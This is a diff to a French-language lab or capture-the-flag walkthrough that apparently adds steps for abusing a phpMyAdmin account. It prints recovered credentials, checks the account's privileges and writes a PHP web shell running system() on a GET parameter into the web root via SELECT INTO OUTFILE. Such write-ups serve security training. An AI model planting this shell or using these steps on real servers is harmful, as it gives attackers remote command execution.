@@ -1283,11 +1283,83 @@ Cette démarche permettra de mieux comprendre comment un accès administratif à
 
 
 
-### Exploitation de `PhpMyAdmin` pour obtenir une exécution de commandes
+### Exploitation de `phpMyAdmin` pour obtenir une exécution de commandes
 
 #### Vérification des privilèges du compte MySQL
 
+Les identifiants récupérés précédemment te permettent de te connecter à l’interface `phpMyAdmin` avec le compte suivant :
+
+```text
+DBadmin:imissyou
+```
+
+Avant de tenter d’écrire un fichier sur le serveur, tu vérifies précisément les privilèges accordés à ce compte MySQL.
+
+Depuis l’onglet **SQL** de `phpMyAdmin`, tu exécutes la requête suivante :
+
+```sql
+SHOW GRANTS;
+```
+
+![Résultat de la requête SHOW GRANTS confirmant les privilèges administratifs du compte DBadmin](phpmyadmin-show-grants.png)
+
+Cette commande affiche les droits attribués au compte utilisé pour la session courante.
+
+La requête retourne le résultat suivant :
+
+```text
+GRANT ALL PRIVILEGES ON *.* TO 'DBadmin'@'localhost'
+```
+
+Le compte `DBadmin` dispose donc de tous les privilèges sur l’ensemble des bases de données et des tables du serveur MySQL.
+
+Cette configuration confirme qu’il ne s’agit pas d’un simple compte applicatif limité à la base `hotel`. Il possède au contraire des droits administratifs particulièrement étendus.
+
+Ces privilèges peuvent notamment autoriser l’utilisation de fonctions permettant de lire ou d’écrire des fichiers depuis MySQL. Leur exploitation reste toutefois soumise à deux autres conditions :
+
+- la configuration du serveur MySQL ne doit pas interdire l’opération ;
+- le compte système qui exécute le service MySQL doit disposer des permissions nécessaires sur le répertoire ciblé.
+
+Le résultat de `SHOW GRANTS` justifie donc de poursuivre les vérifications afin de déterminer si MySQL peut écrire un fichier PHP dans la racine web de l’application.
+
 #### Écriture d’un fichier PHP dans la racine web
+
+Le compte `DBadmin` disposant de privilèges étendus, tu peux maintenant vérifier s’il est possible d’utiliser MySQL pour écrire un fichier dans la racine web de l’application.
+
+Avant d’exécuter la requête, tu sélectionnes la base système `mysql` dans le panneau de gauche de phpMyAdmin. Sans base active, l’interface retourne l’erreur suivante :
+
+```text
+#1046 - No database selected
+```
+
+Le choix de la base `mysql` sert uniquement à fournir un contexte d’exécution à la requête. Le fichier créé ne dépend d’aucune table de cette base.
+
+Depuis l’onglet **SQL**, tu exécutes ensuite :
+
+```sql
+SELECT '<?php if(isset($_GET[''command''])) { system($_GET[''command'']); }?>'
+INTO OUTFILE '/var/www/html/shell.php';
+```
+
+![Création du fichier shell.php dans la racine web depuis phpMyAdmin avec INTO OUTFILE](phpmyadmin_create_shell-php.png)
+
+Les apostrophes entourant `command` sont doublées dans la chaîne SQL afin qu’elles soient correctement écrites dans le fichier PHP.
+
+Le contenu créé dans `shell.php` sera le suivant :
+
+```php
+<?php if(isset($_GET['command'])) { system($_GET['command']); }?>
+```
+
+Le script vérifie que le paramètre GET `command` est présent. Si c’est le cas, la fonction `system()` exécute la commande reçue et retourne son résultat dans la page.
+
+La clause suivante demande à MySQL d’écrire ce contenu dans la racine web :
+
+```sql
+INTO OUTFILE '/var/www/html/shell.php'
+```
+
+La réussite de cette opération dépend à la fois des privilèges MySQL du compte `DBadmin`, de la configuration du serveur et des permissions du compte système qui exécute MySQL.
 
 #### Validation de l’exécution du fichier PHP
 
